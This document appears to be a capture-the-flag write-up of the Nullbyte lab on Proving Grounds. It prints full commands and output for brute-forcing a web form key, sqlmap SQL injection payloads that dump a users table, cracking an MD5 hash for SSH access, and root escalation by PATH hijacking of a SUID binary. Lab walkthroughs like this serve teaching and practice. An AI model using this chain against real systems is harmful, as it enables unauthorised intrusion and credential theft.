### Nullbyte Proving Grounds

### Difficulty = 	Intermediate

### IP Address = 	192.168.95.16

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ nmap -sCV -A 192.168.95.16 -p80,111,777 -oN nmapscan       
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 09:24 WAT
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 09:24 (0:00:00 remaining)
Nmap scan report for 192.168.95.16
Host is up (0.82s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36484/udp6  status
|   100024  1          42420/udp   status
|   100024  1          49066/tcp6  status
|_  100024  1          55196/tcp   status
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.84 seconds
```

So lets head on to the web server
![image](https://user-images.githubusercontent.com/113513376/214514974-5d864833-fdd0-46b3-9a62-0b2c492926cf.png)

We see only that weird image stuff 

I'll download it and know if there's some sort of sweet metadata in it

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ wget http://192.168.95.16/main.gif
--2023-01-25 09:30:23--  http://192.168.95.16/main.gif
Connecting to 192.168.95.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16647 (16K) [image/gif]
Saving to: _main.gif_

main.gif                                             100%[=====================================================================================================================>]  16.26K  55.4KB/s    in 0.3s    

2023-01-25 09:30:24 (55.4 KB/s) - _main.gif_ saved [16647/16647]

                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ exiftool main.gif
ExifTool Version Number         : 12.44
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2015:08:01 17:39:30+01:00
File Access Date/Time           : 2023:01:25 09:30:24+01:00
File Inode Change Date/Time     : 2023:01:25 09:30:24+01:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

Hmmm there's this weird comment thingy

I'll check the web if thats a valid directory

And it is xD
![image](https://user-images.githubusercontent.com/113513376/214515883-b67d3813-f779-4d35-b042-c3909d86a73f.png)

Its asking for us to input the value for the key which we don't know

Checking source code reveals a comment
![image](https://user-images.githubusercontent.com/113513376/214519818-73c2da5a-dbcd-4943-a8eb-908041502fbe.png)

```
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

Hmm from this we know that the key isn't a very secured pass 

So i'ma gonna brute force this xD

Using burp pro for brute force is cool 

I'll intercept the request in burp then transfer it to intruder 

![image](https://user-images.githubusercontent.com/113513376/214519819-e10ed93c-3a0b-43b1-9727-e25d8cd1bd74.png)
![image](https://user-images.githubusercontent.com/113513376/214519941-62f6be59-fabc-46c4-9e1d-8be5c869d45c.png)

Then go to `payload` tab and click on load 
![image](https://user-images.githubusercontent.com/113513376/214521328-daa6d68f-0e8c-4541-a454-64efee3412d7.png)

The password list am using is located in `/usr/share/wordlists/metasploit/password.lst`

After that i'll start the attack

Then after burp starts doing its thing i'll filter by response size

Then i found a response which has different response size
![image](https://user-images.githubusercontent.com/113513376/214521392-375229e8-74a8-48a3-9167-f25910a44924.png)

Now we have the `key` which is `elite`

So lets login then to the web page using the key
![image](https://user-images.githubusercontent.com/113513376/214521936-d5f7d472-d0bc-4475-bc60-5f0ca13ffa00.png)

Another function which allows us search for users

I searched for something and it returned
![image](https://user-images.githubusercontent.com/113513376/214528162-7db2f7a5-7fc7-4778-8a43-1fd4fb55362b.png)

We see its searches what we input and its in for of a GET http method

I'll try sql injection using sqlmap

Using this parameter

```
http://192.168.95.16/kzMb5nVYJw/420search.php?usrtosearch=lol
```

Now we know its vulnerable to sqli and we can now dump the db

```
──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]                                                                                                                                                                    
└─$ sqlmap --url 192.168.95.16/kzMb5nVYJw/420search.php?usrtosearch=lol --random-agent --dbs                                                                                                                       
        ___                                                                                                                                                                                                        
       __H__                                                                                                                                                                                                       
 ___ ___["]_____ ___ ___  {1.7#stable}                                                                                                                                                                             
|_ -| . ["]     | .'| . |                                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
                                                                                                                                                                                                                   
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no
 liability and are not responsible for any misuse or damage caused by this program                                                                                                                                 
                                                                                                                                                                                                                   
[*] starting @ 10:06:48 /2023-01-25/                                                                                                                                                                               
                                                                                                                                                                                                                   
[10:06:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8' from file '/usr/share/
sqlmap/data/txt/user-agents.txt'                                                                                                                                                                                   
[10:06:49] [INFO] testing connection to the target URL                                                                                                                                                             
[10:06:50] [INFO] testing if the target URL content is stable                                                                                                                                                      
[10:06:51] [INFO] target URL content is stable                                                                                                                                                                     
[10:06:51] [INFO] testing if GET parameter 'usrtosearch' is dynamic                                                                                                                                                
[10:06:51] [WARNING] GET parameter 'usrtosearch' does not appear to be dynamic                                                                                                                                     
[10:06:52] [INFO] heuristic (basic) test shows that GET parameter 'usrtosearch' might be injectable (possible DBMS: 'MySQL')                                                                                       
[10:06:52] [INFO] testing for SQL injection on GET parameter 'usrtosearch'                                                                                                                                         
n                                                                                                                                                                                                                  
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y                                                                                                                                                                                                                                    
[10:07:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                                                                                        
[10:07:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                                                                                                                  
[10:07:38] [INFO] GET parameter 'usrtosearch' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="ID")                                            
[10:07:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                            
[10:07:38] [INFO] GET parameter 'usrtosearch' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable                                                          
[10:07:38] [INFO] testing 'MySQL inline queries'                                                                                                                                                                   
[10:07:52] [INFO] GET parameter 'usrtosearch' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:07:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:07:52] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:07:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:07:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech
nique test
[10:07:54] [INFO] target URL appears to have 3 columns in query
[10:07:55] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[10:07:55] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[10:07:55] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'usrtosearch' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=lol" OR NOT 1500=1500#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=lol" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a7171,(SELECT (ELT(5585=5585,1))),0x7171626271,0x78))s), 8446744073709551610, 8446744073709551610)))-- CSDt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=lol" AND (SELECT 5606 FROM (SELECT(SLEEP(5)))unRQ)-- qgjC

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=lol" UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a7171,0x657056716366635a4c6d4642546a4b577768727278464a6c6a745a5941684b626444587679727666,0x7171626271)#
---
[10:07:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie) 
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[10:08:00] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth

[10:08:01] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/192.168.95.16'

[*] ending @ 10:08:01 /2023-01-25/
```

So i'll now i want to get how many tables are in the `seth` db cause that looks more interesting than the other db

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]                                                                                                                                                                    
└─$ sqlmap --url 192.168.95.16/kzMb5nVYJw/420search.php?usrtosearch=lol --random-agent -D seth --tables                                                                                                            
        ___                                                                                                                                                                                                        
       __H__
 ___ ___[)]_____ ___ ___  {1.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:10:16 /2023-01-25/

[10:10:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[10:10:17] [INFO] resuming back-end DBMS 'mysql' 
[10:10:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=lol" OR NOT 1500=1500#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=lol" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a7171,(SELECT (ELT(5585=5585,1))),0x7171626271,0x78))s), 8446744073709551610, 8446744073709551610)))-- CSDt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=lol" AND (SELECT 5606 FROM (SELECT(SLEEP(5)))unRQ)-- qgjC

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=lol" UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a7171,0x657056716366635a4c6d4642546a4b577768727278464a6c6a745a5941684b626444587679727666,0x7171626271)#
---
[10:10:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie) 
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[10:10:18] [INFO] fetching tables for database: 'seth'
Database: seth
[1 table]
+-------+
| users |
+-------+

[10:10:19] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/192.168.95.16'

[*] ending @ 10:10:19 /2023-01-25/
```

We have a `users` table now i'll dump it

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]                                                                                                                                                            [15/204]
└─$ sqlmap --url 192.168.95.16/kzMb5nVYJw/420search.php?usrtosearch=lol --random-agent -D seth --tables users --dump                                                                                               
        ___                                                                                                                                                                                                        
       __H__                                                                                                                                                                                                       
 ___ ___["]_____ ___ ___  {1.7#stable}                                                                                                                                                                             
|_ -| . [)]     | .'| . |                                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
                                                                                                                                                                                                                   
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no
 liability and are not responsible for any misuse or damage caused by this program                                                                                                                                 
                                                                                                                                                                                                                   
[*] starting @ 10:11:06 /2023-01-25/                                                                                                                                                                               
                                                                                                                                                                                                                   
[10:11:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0' from file '/usr/share/sqlmap/d
ata/txt/user-agents.txt'                                                                                                                                                                                           
[10:11:07] [INFO] resuming back-end DBMS 'mysql' 
[10:11:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=lol" OR NOT 1500=1500#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=lol" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a7171,(SELECT (ELT(5585=5585,1))),0x7171626271,0x78))s), 8446744073709551610, 8446744073709551610)))-- CSDt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=lol" AND (SELECT 5606 FROM (SELECT(SLEEP(5)))unRQ)-- qgjC

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=lol" UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a7171,0x657056716366635a4c6d4642546a4b577768727278464a6c6a745a5941684b626444587679727666,0x7171626271)#
---
[10:11:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie) 
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[10:11:08] [INFO] fetching tables for database: 'seth'
Database: seth
[1 table]
+-------+
| users |
+-------+

[10:11:08] [INFO] fetching columns for table 'users' in database 'seth'
[10:11:09] [INFO] fetching entries for table 'users' in database 'seth'
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

[10:11:10] [INFO] table 'seth.users' dumped to CSV file '/home/mark/.local/share/sqlmap/output/192.168.95.16/dump/seth/users.csv'
[10:11:10] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/192.168.95.16'

[*] ending @ 10:11:10 /2023-01-25/
```

We have a user which is `ramses` and a password hash

Using jtr i'll brute force the password hash

But before brute forcing we can tell its base64 encrypted 

So i'll need to decode it

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ cat enc | base64 -d | cut -d ":" -f 1
base64: invalid input
c6d6bd7ebf806f43c76acc3681703b81
```

I just had to `cut` so that the hash will be separate it looks wicked tho 😂

Anyways we have the hash `c6d6bd7ebf806f43c76acc3681703b81` now lets brute force

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ john -w=/home/mark/Documents/rockyou.txt hash --format=Raw-MD5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
omega            (?)     
1g 0:00:00:00 DONE (2023-01-25 10:20) 33.33g/s 384000p/s 384000c/s 384000C/s camaleon..snuffy
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

So now i'll try loggin via ssh on port `777` using this cred `ramses:omega`

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ ssh ramses@192.168.95.16 -p777
The authenticity of host '[192.168.95.16]:777 ([192.168.95.16]:777)' can't be established.
ED25519 key fingerprint is SHA256:qwvVlash7TV33eAaRVfTtUXVDL3X94TXIadEOmWw6gQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.95.16]:777' (ED25519) to the list of known hosts.
ramses@192.168.95.16's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ramses@NullByte:~$ 
```

Lets escalate priv then xD

Checking for binaries with `suid` perm set on it leads here

```
ramses@NullByte:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/procmail
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/exim4
/var/www/backup/procwatch
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
ramses@NullByte:~$
```

Lets go check out the binary 

```
ramses@NullByte:/var/www/backup$ ls -al
total 20
drwxrwxrwx 2 root root 4096 Aug  2  2015 .
drwxr-xr-x 4 root root 4096 Aug  2  2015 ..
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
ramses@NullByte:/var/www/backup$ cat readme.txt 
I have to fix this mess... 
ramses@NullByte:/var/www/backup$ 
```

So lets run the binary to know what it does

```
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 2135 pts/0    00:00:00 procwatch
 2136 pts/0    00:00:00 sh
 2137 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 2138 pts/0    00:00:00 procwatch
 2139 pts/0    00:00:00 sh
 2140 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$ 
```

We see it like runs `ps` command 

Lets run strings on the binary 

```
ramses@NullByte:/var/www/backup$ strings  procwatch                                                                                                                                                                
/lib/ld-linux.so.2                                                                                                                                                                                                 
@rk)                                                                                                                                                                                                               
libc.so.6                                                                                                                                                                                                          
_IO_stdin_used                                                                                                                                                                                                     
system                                                                                                                                                                                                             
__libc_start_main                                                                                                                                                                                                  
__gmon_start__                                                                                                                                                                                                     
GLIBC_2.0                                                                                                                                                                                                          
PTRh                                                                                                                                                                                                               
[^_]                                                                                                                                                                                                               
;*2$"(                                                                                                                                                                                                             
GCC: (Debian 4.9.2-10) 4.9.2                                                                                                                                                                                       
GCC: (Debian 4.8.4-1) 4.8.4                                                                                                                                                                                        
.symtab                                                                                                                                                                                                            
.strtab                                                                                                                                                                                                            
.shstrtab                                                                                                                                                                                                          
.interp                                                                                                                                                                                                            
.note.ABI-tag                                                                                                                                                                                                      
.note.gnu.build-id                                                                                                                                                                                                 
.gnu.hash                                                                                                                                                                                                          
.dynsym                                                                                                                                                                                                            
.dynstr                                                                                                                                                                                                            
.gnu.version                                                                                                                                                                                                       
.gnu.version_r                                                                                                                                                                                                     
.rel.dyn                                                                                                                                                                                                           
.rel.plt                                                                                                                                                                                                           
.init                                                                                                                                                                                                              
.text                                                                                                                                                                                                              
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6279
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
_edata
_fini
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
```

Nothing really leaked hahaha

So i'll download it to my machine and open it up in ghidra to decompile the binary

```
ramses@NullByte:/var/www/backup$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

Now on our machine

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ wget 192.168.95.16:8081/procwatch
--2023-01-25 10:29:04--  http://192.168.95.16:8081/procwatch
Connecting to 192.168.95.16:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4932 (4.8K) [application/octet-stream]
Saving to: _procwatch_

procwatch                                            100%[=====================================================================================================================>]   4.82K  --.-KB/s    in 0s      

2023-01-25 10:29:04 (53.3 MB/s) - _procwatch_ saved [4932/4932]

                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ chmod +x procwatch    
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ ./procwatch                                             
    PID TTY          TIME CMD
  14683 pts/8    00:00:17 zsh
  41627 pts/8    00:00:00 procwatch
  41628 pts/8    00:00:00 sh
  41629 pts/8    00:00:00 ps
```

Now i'll open it up in ghidra

Looking at the main function we see the decompiled code
![Uploading image.png…]()

```

undefined4 main(void)

{
  undefined2 local_42;
  undefined local_40;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  local_42 = 0x7370;
  local_40 = 0;
  system((char *)&local_42);
  return 0;
}
```

Now what it does is this 

```
1. It stores a value in local_42 
2. It then calls system which will run the value stored in the local_42 variable
```

So lets decode the value stored in `local_42` using xxd

``` 
┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ echo 0x7370 | xxd -r    
sp     
```

Now because of 32bits endianess i'll reverse the wordings 

```
┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Nullbyte]
└─$ echo 0x7370 | xxd -r | rev
ps
```

Now its confirmed that the binary runs `system` on `ps`

The problem here is that it doesn't specify the full path to the `ps` binary 

We can take advantage of this by hijacking its path

Lets get to it xD

```
ramses@NullByte:/var/www/backup$ ls -al
total 20
drwxrwxrwx 2 root root 4096 Jan 25 17:37 .
drwxr-xr-x 4 root root 4096 Aug  2  2015 ..
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
ramses@NullByte:/var/www/backup$ echo "/bin/sh" > ps
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ chmod +x ps
```

Now lets run the binary

```
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# cd /root
# ls -al
total 28
drwx------  4 root root 4096 Jan 25 16:21 .
drwxr-xr-x 21 root root 4096 Feb 20  2020 ..
drwx------  2 root root 4096 Aug  2  2015 .aptitude
-rw-------  1 root root    0 Jul  9  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 20  2007 .profile
-rw-r--r--  1 root root   33 Jan 25 16:21 proof.txt
drwx------  2 root root 4096 Aug  2  2015 .ssh
# cat proof.txt
cefbd0091709669e50799995d4109f1c
# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>













